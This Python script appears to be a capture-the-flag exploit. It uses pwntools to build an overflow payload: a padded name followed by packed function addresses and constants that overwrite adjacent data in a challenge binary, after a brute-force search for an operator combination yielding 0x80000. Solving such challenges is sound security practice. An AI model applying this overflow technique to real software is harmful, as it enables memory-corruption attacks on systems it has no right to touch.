import codecs
from pwn import *

def ascii2hex(payload):
    return codecs.encode(payload, "hex")

funcs = {}
funcs["xor"] = 0x20013924
funcs["shiftl"] = 0x20013954
funcs["shiftr"] = 0x20013986
funcs["and"] = 0x200139b8
funcs["or"] = 0x200139e8

m = 5 ** 3
ops = ["^", ">>" , "<<" , "&", "|"]
for i in range(m):

    opp = []

    curr = i
    for o in range(3):
        idx = int(curr % 5)
        opp.append(ops[idx])
        curr /= 5

    operation = f"(0x2590233 {opp[0]} 0x2) {opp[1]} (0x8432873 {opp[2]} 3)"
    val = eval(operation)
    if val == 0x80000:
        print(f"Combination Found: {operation}")
        break


# name
payload = b"Hello"
payload = payload.ljust(24, b'#')

# anon func
payload += p32(funcs["xor"])
# x (print) = w = 0x2590233 ^ 0x2 = 39387697

# fun1
payload += p32(0xdeadbeef)
# w (print) = 0xdeadbeef = -559038737

# w
payload += p32(0xdeadbeef)
# 

# x
payload += p32(funcs["shiftl"])
# y (print) = func3 = 0x8432873 >> 0x3 = 17327374

# fun2
payload += p32(funcs["and"])
# z (default) = -1515870811
# z (print) = i = 39387697 & 17327374 = 0x80000

# fun3
payload += p32(10371212)

# y
payload += p32(0x03)


print(ascii2hex(payload))